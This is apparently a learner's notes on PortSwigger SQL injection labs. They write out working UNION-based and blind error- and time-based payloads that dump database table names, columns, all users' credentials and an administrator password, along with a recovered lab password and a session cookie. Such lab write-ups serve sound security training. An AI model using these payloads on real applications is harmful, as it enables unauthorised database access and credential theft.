 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 

 On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. 
 If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: *UNION SELECT 'abc' FROM dual* 

1. Verify that query is returning two columns, both of which are text using `category` parameter
![[Pasted image 20241118050616.png]]

2. Retrieve list of tables in the db
![[Pasted image 20241118050755.png]]

3. Which name of the table containing user credentials? Retrieve tables
```http
GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
```
![[Pasted image 20241118051503.png]]

4. Retrieve the details in the table
```http
GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GNRBIN'-- HTTP/2
```
![[Pasted image 20241118051707.png]]

5. Retrieve usernames and passwords for all users
```http
GET /filter?category=Gifts'+UNION+SELECT+USERNAME_CUKOIP,+PASSWORD_VEHHOY+FROM+USERS_GNRBIN-- HTTP/2
```

![[Pasted image 20241118051810.png]]



```SQL
'+UNION+SELECT+USERNAME_CUKOIP,+PASSWORD_VEHHOY+FROM+USERS_GNRBIN--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_GNRBIN--
USERNAME_CUKOIP
```

## ðŸŸ¦ Lab 7: SQL injection UNION attack, determining the number of columns returned by the query?
## ðŸŸ¦ Lab 8: SQL injection UNION attack, finding a column containing text ?
## ðŸŸ¦ Lab 9: SQL injection UNION attack, retrieving data from other tables?
## ðŸŸ¦ Lab 10: SQL injection UNION attack, retrieving multiple values in a single column ?
## ðŸŸ¦ Lab 11: Blind SQL injection with conditional responses?
## ðŸŸ¦ Lab 12: Blind SQL injection with conditional errors
### Unclosed quotation mark
Testing for the posibility of error-based SQL injection
`Unclosed quotation mark`
```http
TrackingId=xyz'
-- error
TrackingId=xyz''
--no error
```

*How to test that server is interpreting the injection as a SQL query?*
- construct subquery by using valid SQL syntax

```sql
TrackingId=xyz'||(SELECT '')||'
-- invalid http 500 
TrackingId=xyz'||(SELECT '' FROM dual)||'
-- valid http 200, this is Oracle db
```

### Test 1: is this error caused by SQL query?
Double-verify for the Oracle db using
- invalid query
- valid sql syntax
- if you receive an error, it means that your query is being processed as a SQL query by the back-end
```sql
'||(SELECT '' FROM not-a-real-table)||'
```

Verifying that users table exist
- response 200 -> so it does exist
- `WHERE ROWNUM = 1` is preventing query from returning more than 1 row, that would break concatenation
```sql
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

### Test 2: divide-by-zero error
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- error should be present
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/1) ELSE '' END FROM dual)||'
-- error must dissapear
```

### Checking for the specific entries
`Administrator`
- error should be received to verify value
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

 Determining how many chars in the password
 - condition should be true indicating that the password is greater than 1 char in length
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

We have indeed 20 chars
![[Pasted image 20241104100831.png]]

Testing char at each position to determine it's value
```sql
'||(SELECT CASE WHEN SUBSTR(password,Â§1Â§,1)='Â§aÂ§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
```
![[Pasted image 20241104101419.png]]

hnho3vmrh5n3z52755fk

## ðŸŸ¦ Lab 13: Visible Error-Based SQL Injection
using unterminated string
![[Pasted image 20241104102243.png]]

```sql
'||(SELECT CASE WHEN SUBSTR(password,Â§1Â§,1)='Â§aÂ§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
```

## ðŸŸ¦ Lab 14: ~~~ Lab: Blind SQL injection with time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

Modify trackingId parameter with
```http
Cookie: TrackingId=QpSJ2zQrRCDyp3nJ'||pg_sleep(10)--; session=sqLUeSnBTY8vqLaH6Ke6eC6xXyo5INog
```

## ðŸŸ¦ Lab 15:  ~~~~ Blind SQL injection with time delays and information retrieval ?

## ðŸŸ¦ Lab 16: Blind SQL injection with out-of-band interaction ?
## ðŸŸ¦ Lab 17: Blind SQL injection with out-of-band data exfiltration?

## ðŸŸ¦ Lab 18: SQL injection with filter bypass via XML encoding?
